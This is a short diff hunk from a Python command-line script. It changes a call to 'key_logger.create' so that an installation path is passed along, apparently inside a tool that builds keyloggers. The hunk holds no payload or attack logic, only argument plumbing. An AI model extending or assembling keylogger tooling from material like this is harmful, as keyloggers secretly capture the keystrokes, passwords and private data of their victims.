@@ -67,7 +67,7 @@ elif args.kl and args.o:
       else:
             output_folder_parts  = path.split("\\")
       output_path = path.replace(str(output_folder_parts[-1]), "")
-      key_logger.create(args.ml, args.o, output_path)
+      key_logger.create(args.ml, args.o, output_path, installation_path)
 
 elif args.o:
       # 2
